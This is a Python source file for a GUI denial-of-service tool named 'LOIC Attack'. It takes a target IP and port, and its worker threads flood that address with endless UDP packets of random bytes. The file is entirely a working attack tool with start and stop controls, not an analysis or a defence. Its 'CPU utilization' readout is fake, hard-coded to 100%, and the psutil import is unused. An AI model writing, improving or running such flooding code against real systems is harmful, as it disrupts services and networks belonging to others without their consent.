import tkinter as tk
import socket
import threading
import random
import psutil  # Import psutil library for CPU utilization

class LOIC:
    def __init__(self):
        self.target_ip = ""
        self.target_port = 0
        self.sock = None  # Initialize the socket to None
        self.attack_thread = None
        self.cpu_utilization = 0  # Initialize CPU utilization to 0
        self.threads = 1  # Initialize the number of threads to 1
        self.packets_sent = 0  # Initialize the number of packets sent to 0

    def send_packet(self):
        while True:
            try:
                if self.sock:  # Check if the socket is initialized
                    message = random._urandom(1024)  # Generate random data
                    self.sock.sendto(message, (self.target_ip, self.target_port))
                    self.packets_sent += 1  # Increment the number of packets sent
                    packets_sent_value.config(text=str(self.packets_sent))  # Update the display
                    print(f"Packet sent to {self.target_ip}:{self.target_port}")
                else:
                    print("Socket is not initialized.")
                    break
            except Exception as e:
                print(f"Error sending packet: {e}")
                break

    def start_attack(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Create a new socket
        for _ in range(self.threads):  # Create multiple attack threads
            self.attack_thread = threading.Thread(target=self.send_packet)
            self.attack_thread.start()

    def stop_attack(self):
        if self.sock:  # Check if the socket is initialized
            self.sock.close()
        self.sock = None  # Reset the socket to None when the attack is stopped

    def update_cpu_utilization(self):
        self.cpu_utilization = 100  # Neutralize CPU utilization to 100%

def start_attack():
    loic.start_attack()

def stop_attack():
    loic.stop_attack()

def set_target():
    ip_port = ip_port_entry.get().split(":")
    loic.target_ip = ip_port[0]
    loic.target_port = int(ip_port[1])

def add_threads():
    loic.threads += 1

# Create GUI
root = tk.Tk()
root.title("LOIC Attack")

ip_port_label = tk.Label(root, text="IP:Port")
ip_port_label.pack()
ip_port_entry = tk.Entry(root)
ip_port_entry.pack()

set_target_button = tk.Button(root, text="Set Target", command=set_target)
set_target_button.pack()

start_button = tk.Button(root, text="Start Attack", command=start_attack)
start_button.pack()

stop_button = tk.Button(root, text="Stop Attack", command=stop_attack)
stop_button.pack()

# CPU Utilization label
cpu_util_label = tk.Label(root, text="CPU Utilization (%):")
cpu_util_label.pack()

# Function to update CPU utilization
def update_cpu_util():
    loic.update_cpu_utilization()
    cpu_util_value.config(text=str(loic.cpu_utilization))
    root.after(1000, update_cpu_util)  # Update CPU utilization every second

# CPU Utilization value label
cpu_util_value = tk.Label(root, text="100")
cpu_util_value.pack()

# Packets Sent label
packets_sent_label = tk.Label(root, text="Packets Sent:")
packets_sent_label.pack()

# Packets Sent value label
packets_sent_value = tk.Label(root, text="0")
packets_sent_value.pack()

# Initialize LOIC
loic = LOIC()

# Start updating CPU utilization
update_cpu_util()

root.mainloop()

